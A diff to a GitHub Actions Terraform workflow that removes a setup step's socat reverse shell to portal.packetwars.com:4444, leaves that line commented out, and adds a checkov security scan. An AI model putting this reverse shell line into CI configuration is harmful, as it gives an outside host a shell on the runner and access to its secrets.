@@ -9,7 +9,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: setup
-        run: sudo apt-get -y update; sudo apt-get -y install socat; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:portal.packetwars.com:4444
+        #run: sudo apt-get -y update; sudo apt-get -y install socat; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:portal.packetwars.com:4444
+        run: sudo apt-get -y update; sudo apt-get -y install socat python3-setuptools; sudo pip3 install checkov
       - name: 'Checkout'
         uses: actions/checkout@master
       - name: 'Terraform Format'
@@ -39,4 +40,6 @@ jobs:
           tf_actions_comment: true
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Run checkov
+        run: checkov -d .
     
